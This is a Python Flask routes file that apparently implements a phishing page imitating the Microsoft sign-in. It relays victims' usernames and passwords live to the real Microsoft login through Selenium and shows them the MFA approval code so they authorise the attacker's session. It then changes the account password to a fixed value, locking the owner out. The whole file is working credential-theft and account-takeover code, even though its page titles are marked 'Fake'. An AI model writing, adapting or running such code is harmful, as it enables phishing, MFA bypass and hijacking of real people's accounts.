from flask import render_template, redirect, url_for, session
from app import app
from app.forms import NameForm, PasswordForm

from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

import os

def WEB_DRIVER_NAME(): return "geckodriver.exe"
def NEW_PASSWORD(): return "a" * 8
def WEB_DRIVER_PATH(): return os.path.join(os.getcwd(), WEB_DRIVER_NAME())
def WEB_DRIVER_SERVICE(): return Service(executable_path = WEB_DRIVER_PATH())

DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE())

DRIVER.get("https://myapps.microsoft.com")

password_changed = False

def change_password():
    global password_changed

    DRIVER.get("https://mysignins.microsoft.com/security-info/password/change")
    NEW_PASSWORD_FIELD = WebDriverWait(DRIVER, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
    CONFIRM_PASSWORD_FIELD = DRIVER.find_element(By.NAME, "newPasswordConfirm")

    NEW_PASSWORD_FIELD.send_keys(NEW_PASSWORD())
    CONFIRM_PASSWORD_FIELD.send_keys(NEW_PASSWORD())

    SUBMIT_BUTTON = DRIVER.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
    SUBMIT_BUTTON.click()

    password_changed = True

def get_authentication_code():
    try:
        AUTHENTICATION_CODE = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
        return AUTHENTICATION_CODE.text

    except:
        try:
            RESEND_REQUEST = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
            RESEND_REQUEST.click()
            return get_authentication_code()

        except:
            return False

def enter_field(field_name, value, error_id, clear):
    field = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
    field.send_keys(value, Keys.RETURN)

    try:
        error = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, error_id)))
        if clear:
            field.clear()
        return False

    except:
        return True

def enter_password(password):
    return enter_field("passwd", password, "passwordError", False)

def enter_name(name):
    return enter_field("loginfmt", name, "usernameError", True)
    
@app.route("/")
def index():
    if "name" in session and "password" in session and password_changed:
        return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])

    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    name_form = NameForm()
    password_form = PasswordForm()

    if "name" in session and "password" in session and password_changed:
        return redirect(url_for("index"))

    elif "name" not in session:
        if name_form.validate_on_submit() and enter_name(name_form.name.data):
            session["name"] = name_form.name.data
            return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
    
        return render_template("login.html", title="Fake sign in", header="Fake sign in", form=name_form)

    else:
        if "password" in session:
            authentication_code = get_authentication_code()
            if authentication_code:
                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)

            elif not password_changed:
                change_password()

            try:
                WebDriverWait(DRIVER, 4).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))

            except:
                DRIVER.quit()

            return redirect(url_for("index"))       

        elif password_form.validate_on_submit() and enter_password(password_form.password.data):
            session["password"] = password_form.password.data
            authentication_code = get_authentication_code()
            if authentication_code:
                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)

        return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
